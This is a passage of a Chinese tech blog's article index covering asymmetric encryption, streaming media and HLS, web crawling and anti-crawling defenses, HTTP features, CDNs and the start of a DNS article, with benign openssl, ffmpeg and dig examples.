创建公私钥对。 1openssl genrsa -des3 -out privkey.pem 2048 然后基于私钥生成公钥 1openssl rsa -in privkey.pem -inform pem -pubout -out pubkey.pem 常见非对称加密算法 目前常见且广泛使用的非对称加密算法是 RSA 算法。RSA 依赖的是大整数的分解，以及一些和素数相关的算法，目前没有理论可以破译 RSA 算法，总体来说 RSA 私钥越长破解成本越高，因此仍然被广泛使用。其他的非对称加密算法还有 DSS、ELGamal 等 常见的应用场景非对称加密算法目前广泛应用到各个领域，比如 HTTPS 协议的握手和交换密钥过程需要非对称加密算法；SSH 的通信需要非对称加密算法。另外，证书的生程，比如利用证书实现 git 账号的免密操作也是基于非对称加密算法。在线合同、数字货币的签名等都需要非对称加密算法。 总结那么是不是我们所有的加密的应用都应该用非对称加密呢？ 非对称加密需要更多的运算资源 很多协议使用非对称加密解决最核心的安全问题，再用对称加密解决其他问题 HTTPS 协议为例，客户端和服务器之间会先用非对称加密交换临时对称加密密钥，然后之后的通信以对称加密执行，直到连接结束 对称加密和解密可以用同一套密钥 非对称加密利用数学的方法生成公私钥对，公钥加密的数据私钥可以解密，私钥加密的数据公钥可以解密","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"},{"name":"加密","slug":"加密","permalink":"https://www.shanghua.live/tags/%E5%8A%A0%E5%AF%86/"}]},{"title":"流媒体技术","slug":"计网/流媒体技术","date":"2021-07-08T11:02:48.000Z","updated":"2021-07-08T04:44:46.518Z","comments":true,"path":"2021/07/08/计网/流媒体技术/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/%E6%B5%81%E5%AA%92%E4%BD%93%E6%8A%80%E6%9C%AF/","excerpt":"","text":"流媒体技术在流媒体计数不发达的时代，数据往往是以单个文件的形式存在的，十多年前下载电影（每秒十多 k 的网速），需要等待视频下载完毕来看，往往要花废很多时间 如何将一个视频抽象成流呢？就是传输一部分即可播放一部分，在实际的操作当中，设计了一种类似目录的格式，将音视频数据进行切片，这部分能利用现有的工具 FFmpeg 就可以轻松做到 安装 FFmpeg，利用指令处理一个 MP4 文件，就可以生成很多切片和目录文件 1ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -2 -f hls output.m3u8 上面将input.mp4切割成HTTP Live Streaming 可以播放的切片（大多数浏览器中的播放器都可以播放）。最终会生成大量的切片文件，比如说每个 256k，以及一个目录文件 output.m3u8。 下图展示的是用 FFmpeg 在我的机器上对 input.mp4 操作生成的文件清单： m3u8 文件是目录，它记录了每个视频切片文件（ts）对应的视频时间范围。用户播放视频的时候，会先下载 m3u8 文件。当用户调整视频播放滑块选择播放时间时，播放器就根据 m3u8 的内容下载对应的 ts 文件。 基于流媒体的架构flowchart LR A[视频] --&gt; B{编码} B --&gt; C[流媒体服务] C --4k--&gt; D[支持 4k 设备] C --1080p--&gt; E[支持 1080p 设备] 视频录制完成后，可能是 MP4 等格式。首先，我们将视频上传到服务器进行编码，产生上面提到的切片文件。切片文件存储到流媒体服务器中，当用户需要的时候，就从流媒体服务器中读取视频目录（上面的 m3u8 文件），然后在各个端播放。进行编码的时候，可以根据不同的清晰度编码多个版本，来应对用户在不同网络环境的情况。 直播直播技术仍然可以复用上面的这套架构。录制端不断上传视频内容，视频内容编码后流媒体服务器负责分发。如果观看人数较多，可以使用 CDN 回源到流媒体服务器。对于直播，m3u8 文件可以看作一个动态的文件，能够不断产生新的数据。因此直播技术中，可以考虑将获取 m3u8 文件设计成一个接口，不断由播放器请求新的 m3u8 文件。 其他音视频网站 将视频编码后（含切片），然后利用 CDN 分发目录和切片文件，就可以播放了 视频的编码和解码 通常视频文件较大，因此在传输前通常需要压缩 在播放前需要解码 视频的压缩技术：是针对视频的特征进行处理的压缩技术，与文件压缩技术是不同的，可以把视频看成一直连续的图片，主要是依靠的人类视觉的残留效应 ，视频的压缩也是如此，本质上是对图片的压缩 视频的前一个画面和后一个画面衔接紧密 在连续的多张图片中，也会有重复出现的事物 另外，在连续的多张图片中，也会有重复出现的事物，比如说一座桥、一间教室都可能多次出现。因此，视频压缩可以根据这些特性进行抽象。 对视频进行压缩的时候，视频文件格式也和压缩算法息息相关，我们统称为视频的编码。视频需要编码，包括如何描述目录、如何描述切片、如何存储声音，这些都是编码要考虑的。一个完整的解决方案，我们称为一套视频的编码。比如说 H264 就是国际标准化组织在推广的一种编码格式。当然，所有特性的核心是在减少视频体积（网络传输）的基础上，尽可能地提供更高的画质；另一方面就是要尽可能减少中间编码/解码的时间成本（机器资源）。 宏块在包括 H264 的很多视频编码技术中，都有一个叫作宏块的概念。宏块，就是将画面分成大小不等的区域。比如说 8x8、16x16 等。 当播放两个连续的画面的时候，你可以理解成两张图片。但是如果基于图片分析，那么播放的就是很多个宏块。在这连续的两帧画面中，并不是所有的宏块都发生了变化。特别是当你看一些教学 PPT 的讲稿时，视频前后两帧的宏块基本没有发生变化。因此往往相同画质、相同时长的教学视频体积会远小于电影视频的体积。 具体的压缩算法不在本次课程的涵盖范围之内，如果你感兴趣可以自己去查资料了解一下，参考分组、帧、预测帧等概念。 点到点视频技术在视频会议、面对面聊天等场景下，需要点到点的视频技术 flowchart LR A[Host1] --上传--&gt; B[编码] B --&gt; C[分类] C --&gt; D[分发] D --下载-解码-播放--&gt; E[Host2] 理论上说也可以使用上面的架构，一个客户端将自己本地录制的视频用二进制上传，在服务端编码然后分发到另一个端。数据在另一个端解码并播放。 这样做的缺点是链路较长，于是在实际操作的过程中如果是 1 对 1 的视频聊天，可以考虑实现点到点的服务。 flowchart LR A[Host1] &lt;-----UDP&amp;nbsp等------&gt; B[Host2] 不过不同的主机可能在私有网络 flowchart LR subgraph 内网 A[Host1] &lt;----&gt; B[NAT + 路由器] end B &lt;----&gt; Host2 你会发现如整个设计中需要一个 NAT 路由器，这样客户的数据才能回传到拉勾内网的机器。而实际情况并没有这么简单，在 NAT 通信中，往往需要在内网的主机发起连接。这个时候 NAT 模块识别发起的端口并记录。换句话说，如果某客户的机器是公网 IP，那么内网内部的主机可以找到这个客户，找到之后，双方建立连接。但是某位客户如果想主动发起向内网某台机器的连接，这其实是做不到的。 如果双方都在内网中，都需要 NAT 的场景，其实是无法通信的 flowchart RL subgraph 内网 2 direction LR C[Host2] &lt;----&gt; D[NAT + 路由器] end subgraph 内网 1 direction LR B[NAT + 路由器] &lt;----&gt;A[Host1] end B &lt;---&gt; D 上图这种情况，拉勾内网发起连接，对方的 NAT 路由会因为自己内网的机器没有发起过请求而拒绝；反之，如果客户发起请求，会被拉勾的 NAT 拒绝。这种情况类似于多线程中的“死锁”问题，无法解决。这个时候，就需要一台第三方服务器作为 NAT 模块的辅助功能，帮助双方的 NAT 模块设置本地数据，让双方的 NAT 模块都认为对方已经和自己发起过通信。这个解决方案也叫作NAT 穿透（NAT 穿墙）。 在著名的 WebRTC 协议中，可以提供网页版的在线 1 对 1 聊天，对于多数家庭到家庭的网络来说，是可以正常工作的。如果当你需要连接两个内网的机器，这个时候就需要自己架设第三方服务，或者使用某个收费的第三方服务。 对于在线会议的场景，如果人数较少的情况下，仍然可以使用点到点技术，只不过传输量会随着人数的上升而呈爆发式增长。所以在人数较多的时候，就需要更多的优化策略。当然，其中一种方案就是放弃点到点技术，而直接采用类似直播架构的中心化服务。另一种策略就是利用边缘计算，让距离相近的参会者利用共同的离自己最近的服务器交换数据。 总结视频本质上是一张张图片在播放，因此非常适合流传输。要知道，流是随着时间产生的数据。通常在一个网络中，等价成本下吞吐量、丢包率和延迟 3 者不能兼得。也就是说，像直播这种吞吐量非常大的视频应用，可能就要牺牲延迟。比如之前 B 站直播没有优化前，用户看到的直播画面会比真实的时间会慢近半分钟。 另一方面，像在线会议这类对延迟要求较高的场景，就可能需要降低视频质量，或者部署边缘服务。如果是内网视频会议，或者跨地区的公司视频会议，很容易找到边缘节点帮助交换数据和计算；如果是来自天南地北的用户，那么就需要投入更多成本。对于社交网站而言，需要维护几个人同时语音、视频聊天，因为人数较少，就可以使用点对点技术（但是要解决 NAT 穿墙的问题）。 直播是如何实现的？ 录制端：负责录制直播视频，用流的形式上传。 计算集群：专门负责编码上传的流数据，然后进行压缩、转码、切片等工作。 对象存储：存储原始视频和转码后的视频（相当于 CDN 的源，回源用）。 CDN：将转码后的内容分发到离用户较近的节点，方便用户获取。 直播 App：给用户看直播时使用。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"爬虫和反爬虫","slug":"计网/爬虫和反爬虫","date":"2021-07-08T11:02:48.000Z","updated":"2021-07-08T05:55:25.822Z","comments":true,"path":"2021/07/08/计网/爬虫和反爬虫/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/%E7%88%AC%E8%99%AB%E5%92%8C%E5%8F%8D%E7%88%AC%E8%99%AB/","excerpt":"","text":"爬虫和反爬虫早期一些购票网站起家的时候，就大量使用爬虫技术爬取航空公司的数据，为了不让航空公司屏蔽，特意用了很多个人电脑做爬虫端，让航空公司无法分清哪些是爬虫、哪些是用户一些相互竞争的电商、外卖公司，内部甚至会设立专门的数据爬取小组，用户监控竞品的数据，并且实时地调整业务的竞争策略—-如补贴、签约等黑产利用招聘网站的漏洞，爬取并出售简历数据，再出售给不法分子 爬取数据违法吗首先，爬取一个网站的数据，很可能是违法行为。通常一个网站，会在自己根路径下的 robots.txt 中定义自己网页中哪些数据是可以用来爬取的。从理论上讲，如果你想爬取一个网站的数据，应该先获取它根目录下的 robots.txt 文件，查阅文件内容，看自己要爬取的数据是否被允许。 下面是 bilibili 的 robots.txt 的内容： 12345678910111213141516171819202122User-agent: YisouspiderAllow: /User-agent: ApplebotAllow: /User-agent: bingbotAllow: /User-agent: Sogou inst spiderAllow: /User-agent: Sogou web spiderAllow: /User-agent: 360SpiderAllow: /User-agent: GooglebotAllow: /User-agent: BaiduspiderAllow: /User-agent: BytespiderAllow: /User-agent: PetalBotAllow: /User-agent: *Disallow: / 可以看到，如果你是谷歌、苹果、360、百度等搜索引擎，那么 B 站是欢迎你爬取内容的。如果你是其他的个人或者组织，比如说你想爬取 B 站上所有大 V 的数据，然后将分析结果出售给其他人（比如某个 MCN 平台），实际上是触犯法律的。依据我国的刑法，你可能会被判处非法获取计算机信息系统数据罪，情节严重的可能会被判处 3 年以上的有期徒刑并处罚金。 助点机器人在没有允许的情况下爬取对方的数据是违法行为。但是 这里衍生出一个问题，比如说，你是一个拉勾的付费用户，你觉得拉勾的界面不够智能，于是你自己写了一个程序，只针对自己的账号范围实现某个功能，对拉勾的简历进行筛选，从而找到合适的求职者，这是违法行为吗？ 这个行为不是违法行为。这个行为可以归结成你自己做的一个辅助自己工作的机器人，但是如果你将这个工具提供给其他人，这是违法行为吗？其实也不是违法行为。但是如果其他人将这个工具用作黑产，比如说爬取用户的数据然后进行简历信息的买卖，这就构成了违法行为，构成犯罪的是买卖简历信息。如果你是拉勾的竞品，你使用大量账号这样做，还会构成非法竞争。 换一个例子，有人觉得 Github 不够智能，然后做了一个插件，帮助大家浏览 Github 中文件代码的目录树，本质上这个工具也需要用到爬虫的部分技术——需要爬取这个目录树。但这不是违法行为，但若有人利用类似的工具，将 Github 全部代码都拿走，在淘宝上打包售卖，这就是违法行为了。 爬虫的原理本质上就是一次网络请求，然后将返回的数据保存下来对于搜索引擎的爬虫而言，通常会在请求头上加上自己的标识，比如百度会加上 baidu 字符串,这样方便网站服务器识别 爬虫如果是非法的，往往就需要伪装成浏览器。通常会用到浏览器内核去模拟发出网络请求，比如用 Chromium（Chrome 的开源内核）就可以提供这样的能力。 当你用 Chromium 发起请求的时候，对于服务提供方的反爬虫系统，你的请求就变成了一次标准的用户行为。如果对方网站需要登录才能爬取数据，这个时候，不法分子还会模拟登陆行为。如果仅仅是输入用户名和密码，那这个网站登录行为会非常容易模拟，只需要找到对方对应的接口，把用户名和密码传过去，就可以拿到访问资源的令牌。这就是大部分网站登录时需要你用手机验证码登录、微信扫描、或填写图片验证码的原因。 对于一些获取数据还需要付费的网站，比如说视频网站或拉勾这样的招聘网站，用户需要付费才能获取核心的数据，这个时候不法分子可能会购买大量的账号。为了防止不法分子获得大量的账号，现在国家已经在严打销售手机卡号的行为。所以请你记住，使用其他人的身份去注册账号，这也是一种违法行为。 关于验证码当被爬取的网站登录接口有验证码时，爬虫的设计者通常会有两种手段。一种是破解验证码，在现在这个人工智能的时代，想要破解验证码只需要获得足够多的验证码图片样本，然后用 tensorflow 分析一下，基本上都可以做到一定的识别率，可以高于 80% 以上。所以现在的网站往往不会使用简单的图片验证码，比如说要拖动一个滑块、选中几张图片、算一道数学题等来增加破解成本。我见过最变态的网站验证码是一道化学题，我花了两个小时才注册成功。 所以你的网站如果还在使用普通的图形验证码，而你网站被攻克的代价也很高的话，请你务必早点更换验证码——更换成更难破解的，甚至多种验证码的混合。 模拟用户动作对于一个爬取数据用的浏览器内核，往往还提供了模拟用户行为的功能。比如说点击按钮，滚动一下页面，输入一行文字。所以千万不要觉得，爬虫模拟不了这些用户行为，对于爬虫的设计者，这些都是基础操作。 数据的提取当数据被下载下来之后，爬虫会尝试将原始数据存储，然后再进行离线分析。当然有的爬虫爬取了数据之后就马上进行分析。如果要爬取网页数据，后续会用到 HTML 的解析器（Parser），这个在 Github上 可以找到很多的开源实现。如果是爬取的接口数据，通常就是分析 Json。有的网页数据是由 JavaScript 渲染的，这种网页，通常爬虫会模拟浏览器的行为，在页面加载完成几秒之后才开始下载网页内容。 反追踪对于黑产的爬虫，还会进行 IP 的反追踪。所谓 IP 的反追踪，就是利用代理，增加追踪的成本。比如黑客在从事犯罪活动时通过多次代理，跨了多个国家，那么一个国家的警方力量就很难追踪到他。在爬虫领域有很多人会购买 IP 代理，比如说一个非法的去 B 站收集统计数据的爬虫，为了防止 B 站的追诉以及防止 B 站安全策略的屏蔽，可能会购买大量的 IP，然后模拟成几百个用户在使用 B 站。你要注意，临时租用大量 IP 地址的价格低廉，这也大大降低了犯罪的成本。 反爬虫接下来，我们说说有关反爬虫的一些基本的操作。 robots.txt在反爬虫的时候，第一步我们要先从法律上告诉爬虫哪些页面是不可以爬取的。所以我们要先写好自己的 robots.txt，并放到网站的根目录。 用户的识别接下来我们对于高频访问的 IP 要予以关注。当然，仅仅通过 IP 来判断是不可取的。因为有的时候一家公司会共用一个 IP 出口地址。举个例子：一家猎头公司下面的几百个猎头，可能会每天疯狂的使用拉勾，因此从拉勾的数据上，你会看到大量的重复 IP 访问。这个时候我问你个问题，你禁不禁用这些 IP？当然不能禁用，这些都是付费用户。 那么这个时候有一件非常值得做的事情，就是使用设备的指纹。对于一个设备，它的 CPU 数量、CPU 序列号、屏幕的分辨率、手机的厂商等，通常是固定的。这样可以结合 IP 地址做精细去重。这项技术被称为设备指纹，就是利用设备上的信息，生成一个具有唯一性的字符串，因为这种生成算法是非标准化的，因此不同的数据安全团队会有自己的算法。 有了对用户的识别，就可以根据唯一用户设置数据安全策略，比如访问频次、黑名单等。 字体加密再介绍一种方法是自己实现字符编码和字体文件，增加爬虫爬取数据的成本。 爬虫爬取的通常就是用户本身可以看到的内容。如果自己实现一套自己的字符编码。比如将 UTF8 编码中的汉字打乱顺序，然后再将字体文件中对应的数据换序，得到字体文件。显示简历的时候，使用自己根据这个字符集生成的字体文件。 这样，爬虫下载到网页数据后，中文会乱码，这是因为爬虫无法理解我们创造的非标准字符集编码。当用户看到网页的时候，可以看到正确的内容，这是因为字体文件起了作用。即便爬虫将字体文件打开，和编码对应上，也是非常复杂的一个体力劳动。然后我们每天更换一次顺序，就可以给黑产增加相当大的爬取成本。 加密传输对于移动端 App 中的数据，如果可以加密传输，也能大大增加爬取成本。因为 App 不是浏览器，想要模拟一个 App 是非常困难的。那么 App 的数据抓取就依赖于 App 数据传输使用的标准协议，比如一个用 HTTPS 协议传输数据的 App，爬虫可以在 App 端安装证书，然后再利用代理实现中间人抓包。但如果数据用自己的协议加密，那么爬虫抓包的同时，还必须能够破解这个加密协议。 总结非法爬取数据是不可能完全杜绝的，我们只能提高非法爬取数据的成本。但是一定要有数据安全的意识。在互联网的世界里，数据是第一生产力，也是生命线。在完成开发工作之余，利用自己的专业知识适当提高爬取数据的成本是非常有必要的。 如果自己被公司要求写一个爬虫爬取竞品数据，请你先阅读下竞品的 robots.txt 文件，看看允不允许你这样做。如果这是一个违法行为，那么也可以适当提醒下有这样想法的决策者。 国家对网络信息安全犯罪的打击，只会越来越严。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"HTTP 协议","slug":"计网/HTTP协议","date":"2021-07-08T09:02:56.000Z","updated":"2021-07-08T02:03:23.189Z","comments":true,"path":"2021/07/08/计网/HTTP协议/","link":"","permalink":"https://www.shanghua.live/2021/07/08/%E8%AE%A1%E7%BD%91/HTTP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTP 协议1990 年蒂姆·伯纳斯·李开发了第一个浏览器，书写了第一个 Web 服务器程序和第一张网页。网页用的语言后来被称作超文本标记语言（HTML），而在服务器和客户端之间传输网页的时候，伯纳斯·李没有直接使用传输层协议，而是在 TCP 的基础上构造了一个应用层协议，这个就是超文本传输协议 HTTP。 万维网（World Wide Web，WWW）是博纳斯·李这一系列发明，包括 Web 服务、HTTP 协议、HTML 语言等一个体系的综合 请求响应和长连接HTTP 协议采用请求/返回模型。客户端（通常是浏览器）发起 HTTP 请求，然后 Web 服务端收到请求后将数据回传。 HTTP 的请求和响应都是文本，你可以简单认为 HTTP 协议利用 TCP 协议传输文本。当用户想要看一张网页的时候，就发送一个文本请求到 Web 服务器，Web 服务器解析了这段文本，然后给浏览器将网页回传。 Web 服务器内部就设置一个定时器。在一定范围的时间内，如果客户端继续发送请求，那么服务器就会重置定时器。如果在一定范围的时间内，服务器没有收到请求，就会将连接断开。这样既防止浪费握手、挥手的资源，同时又避免一个连接占用时间过长无法回收导致内存使用效率下降。 我们可以利用 HTTP 协议头进行配置，列如 Keep-Alive: timeout=5s 会告诉 Web 服务器连接的持续时间是 5s，如果 5s 内没有请求，那么连接就会断开 在最初版本是并没有 Keep-Alive 的，随着版本升级，在 HTTP 1.1 才最终支持 Keep-Alive HTTP 2.0 多路复用当一个网站需要加载的资源较多时，浏览器会尝试并发发送请求（利用多线程技术），浏览器会限制同时发送并发请求的数量，通常是 6 个，这样做一方面是对用户本地体验的一种保护，防止浏览器抢占太多网络资源，另一方面也是对站点服务的保护，防止瞬时流量过大 在 HTTP 2.0 之后，增加了多路复用能力。与 RPC 多路复用类似，请求、返回会被拆分成切片，然后混合传输。这样请求、返回之间就不会阻塞。在 HTTP 1.1 的 Keep-Alive 设计中，第二个请求，必须等待第一个请求返回。如果第一个请求阻塞了，那么后续所有的请求都会阻塞。而 HTTP 2.0 的多路复用，将请求返回都切分成小片，这样利用同一个连接，请求相当于并行的发出，互相之间不会有干扰。 HTTP 方法和 RestFul 架构RestFul 是三个单词的缩写 re（Representational）、St（State）、Ful（Transfer） 在 RestFul 架构中，状态仅仅存在于服务端，前端无状态。状态（State）可以理解为业务的状态，这个状态是由服务端管理的。这个无状态和服务端目前倡导的无状态设计不冲突，现在服务端倡导的无状态设计指的是容器内的服务没有状态，状态全部存到合适的存储中去。所以 Restful 中的 State，是服务端状态。 HTTP 方法在 Restful 架构中，除了约定了上述整体架构方案之外，还约束了一些实现细节，比如用名词性的接口和 HTTP 方法来设计服务端提供的接口。 我们使用 GET 获取数据，或者进行查询,如下代码的作用就是获取订单为 123 的订单数据 1GET /order/123 GET 是 HTTP 方法，/order 是一种名词性质的命名，这样设计语义非常清晰，这个接口是获取订单的数据，也就是订单的 Representation 用的 对于更新数据的场景，可以使用 PUT 方法，根据 HTTP 协议规定，PUT 是一种幂等的更新行为，POST 是一种非幂等的更新行为。 12PUT /order/123 &#123;...订单数据&#125; 上面使用 PUT 更新订单，如果订单 123 还没有创建，那么这个接口就会创建订单。如果 123 已经存在，那么这个接口会更新订单 123 的数据，因为 PUT 代表幂等，对于一个幂等的接口，请求多少遍最终的状态是一致的，也就是说操作的都是同一笔订单 如果换成 POST 更新订单： 12POST /order&#123;...订单数据&#125; POST 代表非幂等的设计，像上面这种用 POST 提交表单的接口，调用多次往往会产生多个订单。也就是非幂等的设计每次调用结束后都会产生新的状态。 另外在 HTTP 协议中，还约定了 DELETE 方法用于删除数据。其实还有几个方法，请大家自行查找相关资料，比如 OPTIONS PATCH 缓存在 HTTP 的使用中，我们经常会遇到两种缓存，强制缓存和协商缓存，接下来我举两个场景来说明。 强制缓存你的公司用版本号管理某个对外提供的 JS 文件。比如说 libgo.1.2.3.js，就是 libgo 的 1.2.3 版本。其中 1 是主版本，2 是副版本，3 是补丁编号。每次你们有任何改动，都会更新 libgo 版本号。在这种情况下，当浏览器请求了一次 libgo.1.2.3.js 文件之后，还需要再请求一次吗？ 整理下我们的需求，浏览器在第一次进行了GET /libgo.1.2.3.js这个操作后，如果后续某个网页还用到了这个文件（libgo.1.2.3.js），我们不再发送第二次请求。这个方案要求浏览器将文件缓存到本地，并且设置这个文件的失效时间（或者永久有效）。这种请求过一次不需要再次发送请求的缓存模式，在 HTTP 协议中称为强制缓存。当一个文件被强制缓存后，下一次请求会直接使用本地版本，而不会真的发出去。 使用强制缓存时要注意，千万别把需要动态更新的数据强制缓存。一个负面例子就是小明把获取用户信息数据的接口设置为强制缓存，导致用户更新了自己的信息后，一直要等到强制缓存失效才能看到这次更新。 协商缓存我们再说一个场景：小明开发了一个接口，这个接口提供全国省市区的 3 级信息。先问你一个问题，这个场景可以用强制缓存吗？小明一开始觉得强制缓存可以，然后突然有一天接到运营的通知，某市下属的两个县合并了，需要调整接口数据。小明错手不急，更新了接口数据，但是数据要等到强制缓存失效。 为了应对这种场景，HTTP 协议还设计了协商缓存。协商缓存启用后，第一次获取接口数据，会将数据缓存到本地，并存储下数据的摘要。第二次请求时，浏览器检查到本地有缓存，将摘要发送给服务端。服务端会检查服务端数据的摘要和浏览器发送来的是否一致。如果不一致，说明服务端数据发生了更新，服务端会回传全部数据。如果一致，说明数据没有更新，服务端不需要回传数据。 从这个角度看，协商缓存的方式节省了流量。对于小明开发的这个接口，多数情况下协商缓存会生效。当小明更新了数据后，协商缓存失效，客户端数据可以马上更新。 和强制缓存相比，协商缓存的代价是需要多发一次请求。 总结目前 HTTP 协议已经发展到 2.0 版本，不少网站都更新到 HTTP 2.0 大部分浏览器、CDN 也支持 HTTP 2.0 HTTP 3.0 也在建设当中，HTTP 3.0 对 HTTP 2.0 兼容，主要调整发生在网络底层","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"CDN 内容分发网络","slug":"计网/CDN内容分发网络","date":"2021-07-06T10:36:01.000Z","updated":"2021-07-08T01:01:18.022Z","comments":true,"path":"2021/07/06/计网/CDN内容分发网络/","link":"","permalink":"https://www.shanghua.live/2021/07/06/%E8%AE%A1%E7%BD%91/CDN%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/","excerpt":"","text":"今天使用的电商、直播、社交工具、视频网站中都含有大量的图片、视频、文档等，这些资源需要分发给用户。对于一些体量较大的应用来说，如果把大量资源集中到单一节点进行分发，恐怕很难有某个机房可以支撑得住这么大的流量。例如一个日活在 100W 的小型互联网产品，如果每次请求需要 1M 的数据，那就刚好是近 1TB 数据。对于这样的数据规模而言，完全由单一节点进行分发是不现实的。因此现在互联网应用在分发内容的时候，并不是从自己架设的服务器上直分发内容，而是走一个叫作内容分发网络（Content Dilivery Network）的互联网底层建设。 CDN 是什么内容分发网络（Content Dilivery Network，CDN） 一个专门分发内容的分布式应用，CDN 构建在现有的互联网之上，通过在各地部署数据中心，让不同地域的用户可以就近获取内容这里的内容指的就是 文件、图片、视频、声音、应用程序安装包 为什么不能提供这些资源呢？这和域名系统的 DNS 记录不能集中提供是一个道理，需要考虑到流量、单点故障、延迟等因素。在离用户更近的地理位置提供资源，可以减少延迟。按照地理位置分散提供资源，也可以降低中心化带来的服务压力 因此，CDN 的服务商会选择在全球布点，或者在某个国家布点。具体要看 CDN 服务提供商的服务范围。目前国内的阿里云、腾讯云等也在提供 CDN 业务。 内容的分发 当一个用户请求一个网络资源时，用户请求的是 CDN 提供的资源 当用户请求一个资源时，首先会接触到一个类似域名系统中目录的服务，这个服务会告诉用户究竟去哪个 IP 获取这个资源 很多大型的应用，会吧 DNS 解析作为一种负载均衡的手段 当一个用户请求一个一个网址的时候，会从该网络提供的智能 DNS 中获取网站的 IP。具体请求哪个 IP，是由智能 DNS 中的服务决定的。域名系统允许网站自己为自己的产品提供 DNS 解析，可以参考 DNS 域名解析系统 介绍的 NS 记录 当用户请求一个静态资源的时候，首先会触发域名系统的解析。域名系统会将解析的责任交由 CDN 提供商来处理，CDN 的智能 DNS 服务会帮助用户选择离自己距离最近的节点，返回这个节点的 A（或 AAAA）记录。然后客户端会向 CDN 的资源节点发起请求，最终获得资源。 在上面整个过程当中，CDN 的智能 DNS 还充当了负载均衡的作用。如果一个节点压力过大，则可以将流量导向其他的节点。 回溯CDN 主要用途是提供分发静态资源，那么静态资源提供者如何将资源提供到 CDN 呢？手动上传、接口推送，还是其他别的方式呢？ 你可以把 CDN 想象成一个分布式的分级缓存，再加上数据库的两层设计，用户请求先到达缓存层，如果缓存被穿透，才到达最终的存储层。缓存的设计是分布式的，因为绝大多数的资源使用都会发生在缓存上，只有极少数的请求才会穿透到底层的存储，通常这种设计缓存至少需要挡住 99% 的流量，那么实际的数据存储可以交由源站点完成 单一数据源（Single Souce of Truth，SSOT）在程序设计中，应该尽可能的去减少数据的来源，最好每个数据来源都只有单独一份这样能够避免大量的数据不一致以及同步数据的问题。基于这样的设计，谁来提供资源的存储呢？如果 CDN 提供一份资源的存储不就有两个数据源了吗? 而且只有服务的提供者才能更好的维护这个资源仓库。 在 CDN 的设计当中，CDN 实际上提供的是数据的缓存。而原始数据，则由服务的提供者提供。举个例子，当用户请求某个拉勾网站的静态图片，实际上如果你是要 DIG 命令查看这个网址，会看到如下图所示的结果列如 dig www.lgstatic.com ，就可以看到下面的结果 12345678910111213141516171819202122$ dig www.lgstatic.com ; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; www.lgstatic.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 59409;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 65494;; QUESTION SECTION:;www.lgstatic.com. IN A;; ANSWER SECTION:www.lgstatic.com. 20 IN CNAME www.lgstatic.com.wswebpic.com.www.lgstatic.com.wswebpic.com. 30 IN A 111.7.109.98www.lgstatic.com.wswebpic.com. 30 IN A 111.7.109.87;; Query time: 32 msec;; SERVER: 127.0.0.53#53(127.0.0.53);; WHEN: 三 7月 07 17:24:28 CST 2021;; MSG SIZE rcvd: 117 上面的结果中，拉勾网的静态资源域名 www.lgstatic.com 被 CNAME 到了 www.lgstatic.com.wswebpic.com. 说明当用户请求 www.lgstatic.com 的资源时，实例请求的是 CDN 服务提供商的域名。当用户向 CDN 请求资源的时候，CDN 的智能 DNS 服务就会帮助用户选最优的节点（比如地理上最临近，或者当前比较空闲的）。如果 CDN 节点资源已经存在了用户请求的资源，那么直接返回资源给用户。如果 CDN 中尚未缓存这个资源，此时 CDN 节点就会向拉勾请求资源。也就是说，拉勾网需要有所有的原始数据，并提供出来可以让 CDN 服务访问。 如下图所示，整个过程是 4 个层级。用户请求静态资源通常用自己的域名（防止跨域和一些安全问题）。为了让用户请求的是自己的网站，而使用的是 CDN 的服务，这里会使用 CNAME 让自己的域名作为 CDN 域名的一个别名。当请求到 CDN 服务的时候，会首先由 CDN 的 DNS 服务帮助用户选择一个最优的节点，这个 DNS 服务还充当了负载均衡的作用。接下来，用户开始向 CDN 节点请求资源。如果这个时候资源已经过期或者还没有在 CDN 节点上，就会从源站读取数据，这个步骤称为回溯 flowchart LR A[请求拉勾的图片] --通常伴随 CNAME--&gt; B[CDN 的 DNS 服务] B --负载均衡--&gt; C[CDN 资源节点] C --回溯--&gt; 拉勾服务器 CDN 上缓存的资源通常也会伴随失效时间的设置，当失效之后同样会触发回源，可以通过开发 API 或者 CDN 管理后台直接删除缓存（让资源失效），这个操作后，同样会触发回源 总结CDN 是一种网络应用，作用是分发互联网上的资源。CDN 服务的提供商，会在世界（或国家）范围内设立数据中心，帮助分发资源。用户请求的资源会被 CDN 分发到最临近的节点获取。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"DNS 域名解析系统","slug":"计网/DNS域名解析系统","date":"2021-07-04T17:31:49.000Z","updated":"2021-07-04T11:45:16.776Z","comments":true,"path":"2021/07/05/计网/DNS域名解析系统/","link":"","permalink":"https://www.shanghua.live/2021/07/05/%E8%AE%A1%E7%BD%91/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"DNS 域名解析系统DNS 和统一资源定位服 (URL) 域名系统本质是定位资源 这是一个完整的 URL（Uniform Resource Locator） https://www.example.com:8080/books?id=1000#Good https:// 对应 Scheme：协议，Scheme 有 https、ftp、ssh 等 www.example.com 对应 Host Host 代表站点 8080 对应 端口，代表提供服务的应用 /books 对应 Path，代表资源在服务中的路径 id=1000 对应 Query，查询条件，代表需要的是资源中的某一个部分 #Good 对应 Fragment 代表 